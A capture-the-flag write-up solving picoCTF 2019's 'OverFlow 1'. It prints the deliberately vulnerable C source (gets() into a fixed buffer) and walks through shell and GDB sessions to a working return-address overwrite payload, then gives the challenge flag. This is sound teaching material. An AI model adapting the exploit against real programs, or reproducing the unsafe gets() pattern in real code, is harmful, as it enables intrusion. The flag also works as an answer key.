# PicoCTF19 OverFlow 1

## Challenge

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this [program](https://2019shell1.picoctf.com/static/8b7521756bddb2cce5c14fd2b60cd354/vuln? You can find it in /problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389 on the shell server. [Source](https://2019shell1.picoctf.com/static/8b7521756bddb2cce5c14fd2b60cd354/vuln.c).

## Hints

Take control that return address

Make sure your address is in Little Endian.

## Solution

Let's view that directory:

```bash
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 21:51 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-1_3    42 Sep 28 21:51 flag.txt
-rwxr-sr-x   1 hacksports overflow-1_3  7532 Sep 28 21:51 vuln
-rw-rw-r--   1 hacksports hacksports     742 Sep 28 21:51 vuln.c
```

Let's view `vuln.c`

```
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

As expected, there is a function that prints the flag but it's never explicitly called.

The program takes a string and attempts to jump to that address. But hey, since this is an overflow question let's just give the program a bunch of garbage and see what happens.

```bash
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ ./vuln
Give me a string and lets see what happens: 

Woah, were jumping to 0x8048705 !
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ ./vuln
Give me a string and lets see what happens: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x41414141 !
Segmentation fault (core dumped)
```

Hmm: `0x41414141`. If you're familiar with the [ASCII Table](https://en.wikipedia.org/wiki/ASCII), `A` is `41` in hexadecimal.

So it looks like we overwrite some instructions with our input. Let's find the minimal amount of `A`'s required to change the jump address.

```bash
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ echo $(python -c "print 'A'*77") | ./vuln
Give me a string and lets see what happens:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x8040041 !
Segmentation fault (core dumped)
```

Notice how with no input the value is `0x8048705` but with 77 `A`'s, it's `0x8040041`.

You can see the first `41` is at the end. This is due to `x86_64` working in little endian mode.

So basically this overflow seems like we might have to overwrite the address with the address of the flag and in order to do that we first need to figure out which memory address the flag function is located at and we can do that with GDB.

```bash
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ gdb ./vuln 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) x flag
0x80485e6 <flag>:       0x53e58955
(gdb) q
```

There it is at memory address `0x80485e6`.

Let's try working that into the address:

```bash
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ echo $(python -c "print 'A'*77+'\xe6'")  | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x800e641 !
Segmentation fault (core dumped)
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ echo $(python -c "print 'A'*76+'\xe6'") | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80400e6 !
Segmentation fault (core dumped)
samson@pico-2019-shell1:/problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389$ echo $(python -c "print 'A'*76+'\xe6\x85\x04\x08'") | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
```

## Flag

`picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}`